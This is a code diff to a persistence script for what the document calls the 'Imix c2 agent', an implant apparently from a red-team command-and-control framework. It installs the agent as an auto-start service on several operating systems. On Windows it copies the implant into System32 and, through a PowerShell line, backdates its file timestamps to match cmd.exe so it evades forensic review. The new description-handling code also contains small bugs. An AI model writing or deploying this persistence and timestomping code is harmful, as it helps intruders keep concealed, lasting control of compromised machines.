@@ -318,11 +318,20 @@ def launch_daemon(service_name, executable_path, executable_args):
     print("Launch daemon installed")
 
 
-def windows_service_manager(service_name, service_display_name, service_description, executable_path):
-    create_res = sys.shell("sc.exe create "+service_name+" binpath= "+executable_path +
-                           " displayname="+service_display_name+" start= auto type= own")
+def windows_service_manager(service_name, service_display_name, service_description, executable_path, executable_args):
+    binpath = executable_path
+    if executable_args != "":
+        binpath = executable_path + " " + executable_args
+    create_res = sys.shell("sc.exe create "+service_name+" binpath= \""+binpath+
+                           "\" displayname=\""+service_display_name+"\" start= auto type= own")
     if 'ERROR' in create_res['stdout'] or 'USAGE' in create_res['stdout'] or create_res['stderr'] != "":
         print("Failed to create service:\n"+str(create_res)+"\n")
+        print("\n")
+        return
+
+    desc_res = sys.shell("sc.exe description "+service_name+" \""+service_description+"\"")
+    if 'ERROR' in desc_res['stdout'] or 'USAGE' in create_res['stdout'] or desc_res['stderr'] != "":
+        print("Failed to set service description:\n"+desc_res+"\n")
         print("\n")
         return
 
@@ -333,7 +342,7 @@ def windows_service_manager(service_name, service_display_name, service_descript
         return
 
 
-def persist_service(service_name, service_desc, executable_name, executable_args):
+def persist_service(service_name, service_desc, executable_name, executable_args, windows_display_name):
     src_path = process.info()['exe']
     if sys.is_linux():
         executable_path = "/bin/"+executable_name
@@ -349,10 +358,11 @@ def persist_service(service_name, service_desc, executable_name, executable_args
         file.copy(src_path, executable_path)
         launch_daemon(service_name, executable_path, executable_args)
     elif sys.is_windows():
-        executable_path = "C:\\ProgramData\\"+executable_name+".exe"
+        executable_path = "C:\\Windows\\System32\\"+executable_name+".exe"
         file.copy(src_path, executable_path)
+        sys.shell(f"""powershell /c "\$src = Get-Item 'C:\\Windows\\System32\\cmd.exe'; \$tgt = Get-Item '{executable_path}'; $tgt.CreationTime = $src.CreationTime; $tgt.LastWriteTime = $src.LastWriteTime; $tgt.LastAccessTime = $src.LastAccessTime" """)
         windows_service_manager(
-            service_name, service_name, service_desc, executable_path)
+            service_name, windows_display_name, service_desc, executable_path, executable_args)
     elif sys.get_os()['platform'] == "BSD":
         executable_path = "/bin/"+executable_name
         file.copy(src_path, executable_path)
@@ -372,7 +382,8 @@ def parse_and_persist(config_data):
             conf['name'],
             conf['description'],
             conf['executable_name'],
-            "",
+            conf['executable_args'],
+            conf['windows_display_name'],
         )
 
 
@@ -391,8 +402,9 @@ def main():
     config_data = {
         "service_configs": [
             {
-                "name": "imix",
-                "description": "Imix c2 agent",
+                "name": "imixsvc",
+                "windows_display_name": "Imix c2 agent",
+                "description": "Imix C2 Agent",
                 "executable_name": "imix",
                 "executable_args": ""
             }
